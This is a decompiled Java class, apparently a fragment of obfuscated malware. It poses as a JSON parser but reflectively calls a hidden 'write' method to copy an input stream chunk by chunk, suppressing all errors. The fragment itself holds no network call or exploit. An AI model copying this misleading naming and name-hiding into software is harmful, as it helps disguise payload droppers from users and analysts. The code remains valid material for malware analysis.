// 
// Decompiled by Procyon v0.5.30
// 

package json;

import java.io.InputStream;
import java.lang.reflect.Method;
import java.beans.Expression;

public class ThreadParser extends Expression
{
    public static Method m;
    protected static int ctr;
    public static byte[] rwBuff;
    
    protected static String repeat() {
        return "  write".trim();
    }
    
    public static void getSubstring(final InputStream inputStream, final Object o) {
        try {
            ThreadParser.m = o.getClass().getMethod(repeat(), ThreadParser.rwBuff.getClass(), Integer.TYPE, Integer.TYPE);
        }
        catch (Exception ex) {}
        try {
            while ((ThreadParser.ctr = inputStream.read(ThreadParser.rwBuff, 0, 1000)) != -1 && Parser.decode2JSON(ThreadParser.m, o, new Object[] { ThreadParser.rwBuff, 0, ThreadParser.ctr })) {}
        }
        catch (Exception ex2) {}
    }
    
    public ThreadParser(final Object o, final String s, final Object[] array) {
        super(o, s, array);
    }
    
    static {
        ThreadParser.rwBuff = new byte[1000];
    }
}
